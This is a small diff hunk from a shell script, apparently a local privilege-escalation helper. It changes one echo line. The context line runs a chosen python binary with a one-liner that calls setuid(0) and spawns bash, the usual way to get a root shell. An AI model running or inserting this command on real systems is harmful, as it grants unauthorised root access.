@@ -170,7 +170,7 @@ while true; do
                     case "$choice" in
                         *python*)
                         
-                            echo "Trying with python3"
+                            echo "Trying with $choice"
                             
                             "$choice" -c 'import os; os.setuid(0); os.system("bash")'
 
